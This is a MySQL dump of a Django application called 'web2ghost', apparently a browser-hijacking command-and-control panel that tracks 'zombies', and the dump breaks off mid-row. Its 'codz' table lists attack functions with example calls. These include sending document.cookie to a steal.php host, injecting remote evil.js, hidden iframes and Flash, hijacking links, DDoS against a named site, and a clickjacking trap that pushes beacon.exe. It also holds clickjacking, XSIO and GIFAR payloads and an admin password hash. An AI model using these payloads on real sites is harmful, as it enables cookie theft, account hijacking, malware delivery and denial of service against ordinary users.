-- MySQL dump 10.11
--
-- Host: localhost    Database: web2ghost
-- ------------------------------------------------------
-- Server version	5.0.51b-community-nt-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `auth_group`
--

DROP TABLE IF EXISTS `auth_group`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `auth_group` (
  `id` int(11) NOT NULL auto_increment,
  `name` varchar(80) NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `auth_group`
--

LOCK TABLES `auth_group` WRITE;
/*!40000 ALTER TABLE `auth_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group_permissions`
--

DROP TABLE IF EXISTS `auth_group_permissions`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `auth_group_permissions` (
  `id` int(11) NOT NULL auto_increment,
  `group_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `group_id` (`group_id`,`permission_id`),
  KEY `auth_group_permissions_425ae3c4` (`group_id`),
  KEY `auth_group_permissions_1e014c8f` (`permission_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `auth_group_permissions`
--

LOCK TABLES `auth_group_permissions` WRITE;
/*!40000 ALTER TABLE `auth_group_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_message`
--

DROP TABLE IF EXISTS `auth_message`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `auth_message` (
  `id` int(11) NOT NULL auto_increment,
  `user_id` int(11) NOT NULL,
  `message` longtext NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `auth_message_403f60f` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `auth_message`
--

LOCK TABLES `auth_message` WRITE;
/*!40000 ALTER TABLE `auth_message` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_permission`
--

DROP TABLE IF EXISTS `auth_permission`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `auth_permission` (
  `id` int(11) NOT NULL auto_increment,
  `name` varchar(50) NOT NULL,
  `content_type_id` int(11) NOT NULL,
  `codename` varchar(100) NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `content_type_id` (`content_type_id`,`codename`),
  KEY `auth_permission_1bb8f392` (`content_type_id`)
) ENGINE=MyISAM AUTO_INCREMENT=40 DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `auth_permission`
--

LOCK TABLES `auth_permission` WRITE;
/*!40000 ALTER TABLE `auth_permission` DISABLE KEYS */;
INSERT INTO `auth_permission` VALUES (1,'Can add zombies',1,'add_zombies'),(2,'Can change zombies',1,'change_zombies'),(3,'Can delete zombies',1,'delete_zombies'),(4,'Can add zombies cmd',2,'add_zombiescmd'),(5,'Can change zombies cmd',2,'change_zombiescmd'),(6,'Can delete zombies cmd',2,'delete_zombiescmd'),(7,'Can add permission',3,'add_permission'),(8,'Can change permission',3,'change_permission'),(9,'Can delete permission',3,'delete_permission'),(10,'Can add group',4,'add_group'),(11,'Can change group',4,'change_group'),(12,'Can delete group',4,'delete_group'),(13,'Can add user',5,'add_user'),(14,'Can change user',5,'change_user'),(15,'Can delete user',5,'delete_user'),(16,'Can add message',6,'add_message'),(17,'Can change message',6,'change_message'),(18,'Can delete message',6,'delete_message'),(19,'Can add content type',7,'add_contenttype'),(20,'Can change content type',7,'change_contenttype'),(21,'Can delete content type',7,'delete_contenttype'),(22,'Can add session',8,'add_session'),(23,'Can change session',8,'change_session'),(24,'Can delete session',8,'delete_session'),(25,'Can add site',9,'add_site'),(26,'Can change site',9,'change_site'),(27,'Can delete site',9,'delete_site'),(28,'Can add log entry',10,'add_logentry'),(29,'Can change log entry',10,'change_logentry'),(30,'Can delete log entry',10,'delete_logentry'),(31,'Can add codz',11,'add_codz'),(32,'Can change codz',11,'change_codz'),(33,'Can delete codz',11,'delete_codz'),(34,'Can add zombies detail',12,'add_zombiesdetail'),(35,'Can change zombies detail',12,'change_zombiesdetail'),(36,'Can delete zombies detail',12,'delete_zombiesdetail'),(37,'Can add zombies shadow',13,'add_zombiesshadow'),(38,'Can change zombies shadow',13,'change_zombiesshadow'),(39,'Can delete zombies shadow',13,'delete_zombiesshadow');
/*!40000 ALTER TABLE `auth_permission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user`
--

DROP TABLE IF EXISTS `auth_user`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `auth_user` (
  `id` int(11) NOT NULL auto_increment,
  `username` varchar(30) NOT NULL,
  `first_name` varchar(30) NOT NULL,
  `last_name` varchar(30) NOT NULL,
  `email` varchar(75) NOT NULL,
  `password` varchar(128) NOT NULL,
  `is_staff` tinyint(1) NOT NULL,
  `is_active` tinyint(1) NOT NULL,
  `is_superuser` tinyint(1) NOT NULL,
  `last_login` datetime NOT NULL,
  `date_joined` datetime NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `auth_user`
--

LOCK TABLES `auth_user` WRITE;
/*!40000 ALTER TABLE `auth_user` DISABLE KEYS */;
INSERT INTO `auth_user` VALUES (1,'admin','','','a@a.com','sha1$4efa3$ef5a60053f78c531b24e6082c7b9b7a8bd9b42b3',1,1,1,'2011-12-05 12:17:56','2011-09-10 08:48:59');
/*!40000 ALTER TABLE `auth_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_groups`
--

DROP TABLE IF EXISTS `auth_user_groups`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `auth_user_groups` (
  `id` int(11) NOT NULL auto_increment,
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `user_id` (`user_id`,`group_id`),
  KEY `auth_user_groups_403f60f` (`user_id`),
  KEY `auth_user_groups_425ae3c4` (`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `auth_user_groups`
--

LOCK TABLES `auth_user_groups` WRITE;
/*!40000 ALTER TABLE `auth_user_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_user_permissions`
--

DROP TABLE IF EXISTS `auth_user_user_permissions`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `auth_user_user_permissions` (
  `id` int(11) NOT NULL auto_increment,
  `user_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `user_id` (`user_id`,`permission_id`),
  KEY `auth_user_user_permissions_403f60f` (`user_id`),
  KEY `auth_user_user_permissions_1e014c8f` (`permission_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `auth_user_user_permissions`
--

LOCK TABLES `auth_user_user_permissions` WRITE;
/*!40000 ALTER TABLE `auth_user_user_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_user_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `codz`
--

DROP TABLE IF EXISTS `codz`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `codz` (
  `id` int(11) NOT NULL auto_increment,
  `key` varchar(200) NOT NULL,
  `type` varchar(30) default NULL,
  `catelog` varchar(100) NOT NULL,
  `codz` longtext NOT NULL,
  `desc` longtext NOT NULL,
  `author` varchar(100) default NULL,
  `add_time` datetime NOT NULL,
  `up_time` datetime NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `key` (`key`)
) ENGINE=MyISAM AUTO_INCREMENT=19 DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `codz`
--

LOCK TABLES `codz` WRITE;
/*!40000 ALTER TABLE `codz` DISABLE KEYS */;
INSERT INTO `codz` VALUES (1,'w2g.watermark.set','system','watermark','-','设置持久性的水印，如：\nw2g.watermark.set(\'evercookie\',\'xxx\');','','2011-10-27 10:02:31','2011-10-27 10:02:31'),(2,'w2g.watermark.get','system','watermark','-','获取水印，如：\nw2g.watermark.get(\'evercookie\');','','2011-10-27 10:01:54','2011-10-27 10:01:54'),(3,'w2g.ajax.req','system','ajax','-','AJAX请求发送接口，参数说明：\n{\n	type: \"POST\", // GET\n	url: \"\",\n	async: true, // false\n	contentType: \"application/x-www-form-urlencoded\", // multipart/form-data; boundary=-------------------7964f8dddeb95fc5\n	data: {a:1, b:2},\n	callback: function, // 函数引用\n}\n如：\nw2g.ajax.req({type:\"POST\", url:\"http://f.com/do\", async:true, data:{a:1,b:2}, callback:xxx});','','2011-10-27 09:45:01','2011-10-27 09:45:01'),(4,'w2g.inject.script','system','inject','-','注入远程js文件，如：\nw2g.inject.script(\'http://x.com/evil.js\');','','2011-10-27 09:44:49','2011-10-27 09:44:49'),(5,'w2g.inject.script2obj','system','inject','-','往指定同域的iframe内注入远程js文件，如：\nw2g.inject.script2obj(document.getElementById(\'iframe_a\'),\'http://x.com/evil.js\');','','2011-10-27 09:40:27','2011-10-27 09:40:27'),(6,'w2g.inject.iframe','system','inject','-','注入一个隐藏的iframe，如：\nw2g.inject.iframe(\'http://w.com/evil.html\');','','2011-10-27 09:40:19','2011-10-27 09:40:19'),(7,'w2g.inject.flash','system','inject','-','注入flash文件，参数说明：\n{\n	src: \"\",\n	width: 0,\n	height: 0,\n	allowNetworking: \"all\", // internal, none\n	allowScriptAccess: \"always\", // never, sameDomain\n}\n如：\nw2g.inject.flash({src:\"http://x.com/evil.swf\", allowScriptAccess:\"always\"});','','2011-10-27 09:40:12','2011-10-27 09:40:12'),(8,'w2g.hijack.links','system','hijack','-','劫持同域内的链接点击，当用户点击链接时，会打开新的页面，并注入指定的远程js文件。\n\n如： w2g.hijack.links(\"http://w2g:8888/payloads/lib/browserjack.js\");','','2011-10-27 09:40:00','2011-10-27 09:40:00'),(9,'w2g.net.get','system','net','-','发起一次GET请求，如：\nw2g.net.get(\'http://w.com/steal.php?data=\'+escape(document.cookie));','','2011-10-27 09:44:38','2011-10-27 09:44:38'),(10,'w2g.net.post','system','net','-','发起一次POST请求，参数说明：\n{\n	url: \"\",\n	data: {a:1, b:2},\n	target: \"xxx\", // 比如某iframe的name值\n}\n如：\nw2g.net.post({url:\'http://w.com/steal.php\',data:{a:1,b:2}});','','2011-10-27 09:48:02','2011-10-27 09:48:02'),(11,'w2g.cookie.set','system','cookie','-','添加cookie，参数说明：\nname: cookie名\nvalue: cookie值\nexpires: \'Wed, 24 Aug 2012 08:50:46 GMT\'\npath: 可以设置子目录\ndomain: 可以设置本域及父域\nsecure: 随便指定一个值就是secure，这样的cookie将在SSL层传输\n如：\nw2g.cookie.set(\'w2g-jacked\',\'1\',\'Wed, 24 Aug 2012 08:50:46 GMT\');','','2011-10-27 09:51:07','2011-10-27 09:51:07'),(12,'w2g.cookie.get','system','cookie','-','获取指定name的cookie值，如：\nw2g.cookie.get(\'sid\');','','2011-10-27 09:52:04','2011-10-27 09:52:04'),(13,'w2g.cookie.del','system','cookie','-','删除指定name的cookie值，如：\nw2g.cookie.del(\'w2g-jacked\');','','2011-10-27 09:53:03','2011-10-27 09:53:03'),(14,'w2g.misc.ddos','system','misc','-','发起DDOS攻击，如：\nw2g.misc.ddos(\'http://www.baidu.com/\');','','2011-10-27 10:00:12','2011-10-27 10:00:12'),(15,'clickjacking-demo','payload','uiredress','<style>\niframe {\n  position: absolute;\n  width: 600px;\n  height: 250px;\n  top: 0px;\n  left: 0px;\n  z-index: 2;\n  opacity: 0;\n  filter: alpha(opacity=0);\n}\nbutton {\n  position: absolute;\n  height: 35px;\n  top: 230px;\n  left: 480px;\n  z-index: 1;\n}\n</style>\n<div><img src=\"mm.jpg\" /></div>\n<button>点击这里</button>\n<iframe src=\"http://www.baidu.com/\" scrolling=\"no\"></iframe>','一个点击劫持样例，关键之处是将目标地址iframe进来，然后设置为透明。','x','2011-10-27 10:07:01','2011-10-27 10:07:01'),(16,'xsio-demo','payload','uiredress','<a href=\"http://www.evil.com\"><img src=\"http://img.baidu.com/hi/img/portraitn.jpg\" style=\"position:absolute;left:123px;top:123px;\"></a>','XSIO样例，通过设置图片等的位置偏移来覆盖原来页面的一些功能，导致用户点击时，实际上是点击了这个图片。','x','2011-10-27 10:17:59','2011-10-27 10:17:59'),(17,'gifar-demo','payload','xdomain','<applet codebase=\"http://www.baidu.com/\" code=\"Gifar.class\" archive=\"2.gif\" name=\"gifar.jar\" >\n<PARAM name=\"url\" value=\"http://www.baidu.com/admin/\"></PARAM>\n</applet>\n\ngifar.class代码：\nimport java.applet.Applet;\nimport java.io.InputStream;\nimport java.net.URL;\nimport java.net.URLConnection;\npublic class Gifar extends Applet {\n    public void init() {\n        URLConnection uc;\n        try {\n             URL url = new URL(this.getParameter(\"url\"));\n             uc = url.openConnection();\n             InputStream inputstream = null;\n             inputstream = uc.getInputStream();\n             System.out.println(\"success\");\n        } catch (Exception ex) {\n             System.out.println(\"error\");\n        }\n    }\n}','GIFAR本质上是java的一个跨域漏洞，利用条件稍微复杂些。下面是描述：\nJava Applet本身的安全机制是不允许跨站的，它只允许自己访问applet标签所在页面的域。但是当applet标签中的codebase属性给定了一个URL，让当前页面的applet到另一个域获取class或jar文件时，applet会自动为自己添加一个socket permission，也就是添加一个可以到class文件所在域的权限。使用copy /B命令可以把一个jar文件捆绑到一个gif上，捆绑后，同样可以让java虚拟机把这个GIF当成applet解释执行。这个技巧为漏洞的利用提供了便利，虽然我们不能给目标服务器上传jar文件，但是我们有可能会被允许上传gif。','','2011-10-27 10:31:44','2011-10-27 10:31:44'),(18,'w2g.net.inner_ip','system','net','-','获取内网ip地址，如：\nw2g.net.inner_ip();\n结果可以查看目标zombie的详细。','','2011-10-31 21:48:52','2011-10-31 21:48:52'),(19,'w2g.hijack.screenshots','system','hijack','-','定时对当前js所在的页面进行截图\n参数说明:\ninterval 截图的间隔时间，默认为30秒截图一次，输入的单位为秒。\n\n用法:\nw2g.hijack.screenshots(30);','','2011-10-31 21:48:52','2011-10-31 21:48:52'),(20,'w2g.hijack.clickhijack','system','hijack','-','点击劫持，实现效果是插入iframe后设置为透明，点击一次页面后提示下载，然后劫持失效(只劫持一次点击)\n参数说明:\nsrc 目标下载地址\n[id]可选，iframe标签的id\n\n用法\nw2g.hijack.clickhijack(\'http://www.evil.com/beacon.exe\',\'clickmetest\');','','2011-10-31 21:48:52','2011-10-31 21:48:52');
/*!40000 ALTER TABLE `codz` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_admin_log`
--

DROP TABLE IF EXISTS `django_admin_log`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `django_admin_log` (
  `id` int(11) NOT NULL auto_increment,
  `action_time` datetime NOT NULL,
  `user_id` int(11) NOT NULL,
  `content_type_id` int(11) default NULL,
  `object_id` longtext,
  `object_repr` varchar(200) NOT NULL,
  `action_flag` smallint(5) unsigned NOT NULL,
  `change_message` longtext NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `django_admin_log_403f60f` (`user_id`),
  KEY `django_admin_log_1bb8f392` (`content_type_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `django_admin_log`
--

LOCK TABLES `django_admin_log` WRITE;
/*!40000 ALTER TABLE `django_admin_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `django_admin_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_content_type`
--

DROP TABLE IF EXISTS `django_content_type`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `django_content_type` (
  `id` int(11) NOT NULL auto_increment,
  `name` varchar(100) NOT NULL,
  `app_label` varchar(100) NOT NULL,
  `model` varchar(100) NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `app_label` (`app_label`,`model`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `django_content_type`
--

LOCK TABLES `django_content_type` WRITE;
/*!40000 ALTER TABLE `django_content_type` DISABLE KEYS */;
INSERT INTO `django_content_type` VALUES (1,'zombies','cc','zombies'),(2,'zombies cmd','cc','zombiescmd'),(3,'permission','auth','permission'),(4,'group','auth','group'),(5,'user','auth','user'),(6,'message','auth','message'),(7,'content type','contenttypes','contenttype'),(8,'session','sessions','session'),(9,'site','sites','site'),(10,'log entry','admin','logentry'),(11,'codz','codz','codz'),(12,'zombies detail','cc','zombiesdetail'),(13,'zombies shadow','cc','zombiesshadow');
/*!40000 ALTER TABLE `django_content_type` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_session`
--

DROP TABLE IF EXISTS `django_session`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `django_session` (
  `session_key` varchar(40) NOT NULL,
  `session_data` longtext NOT NULL,
  `expire_date` datetime NOT NULL,
  PRIMARY KEY  (`session_key`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `django_session`
--

LOCK TABLES `django_session` WRITE;
/*!40000 ALTER TABLE `django_session` DISABLE KEYS */;
INSERT INTO `django_session` VALUES ('6ced46943635b45f0a71c0f66159a69b','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-10-10 22:51:15'),('f0017c35f003367c5c750e21a884da73','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-09-24 08:51:51'),('1f6d38cd048b06576648f5d1afeb89f8','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-10-02 11:52:28'),('1744ef5124ec613444292f093c771c6c','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-10-09 10:32:07'),('4239987324307accb955178f72554db5','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-10-10 22:46:00'),('63ab49dd35d20963fb512be25798fedf','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-10-10 23:10:54'),('ffd3b6b81aa27c655e3a585ce2acffa0','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-10-10 22:53:59'),('672fd79a4b01e047f4d08b7d2b4e7a57','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-10-10 23:10:55'),('455dde1475eea2bd7e7c5ad957439335','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-10-10 23:11:06'),('2ec8aa6fe6054779dc73cf7425f0c02e','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-13 12:07:04'),('f69bffe64560dae6b3c02d07b730ef63','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-10-31 20:54:17'),('d0ace75183f55465c9d68b025df09240','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-11-03 21:26:41'),('59982e6d252fb5f520e6e86c6bb3b1c3','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-11-03 21:27:09'),('f7e422f6e2220a355ebb073ba1eea516','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-11-03 21:27:38'),('4abcbac67e7fdf0f8ba1e6669837448e','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 14:48:42'),('1be1991857232764cf7dcee810bc8a04','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 12:50:17'),('468e02bd5054c466b70c066ed4ede676','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 13:29:08'),('596d10461f839cc13403da6b9b084855','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 13:48:29'),('562b728f42557341d8135a8de43ff4be','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 14:01:28'),('ec3554fa781dfba09d008960a348fc38','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 14:54:32'),('9133b623d68a753e55e79aec87b705c8','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 14:54:57'),('c1b7efff6bc3c1e98fdac031ef86402c','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 14:56:38'),('29d76a30aba271fe220da4df97d6e96d','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 14:56:48'),('cd4852209e16a1d4571126380a3af88f','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 14:58:13'),('286084ab198af258760fdd5385d19b02','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 14:58:13'),('993f850616652db5fa485181d971932d','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 14:59:49'),('74c1a74d70117bb3bba0abc31181554f','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 14:59:49'),('73a84d58005dd14e0801a1e6ce18a5c6','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 15:00:59'),('e4cbbf8b6fe7f1b9cd05af50ccf811e4','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 15:00:59'),('ad1873a3fb809652b1d598b456f166c0','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 15:02:07'),('f22541e820d88fd23450e8ad5382d0eb','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 15:02:07'),('dc349d682c92d78f287ee630c81a5606','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-14 15:02:52'),('f49daafb3340d6c2c70bc0560308d810','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-11-21 11:03:02'),('1a18acf3442890981f2b62395a147d48','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-21 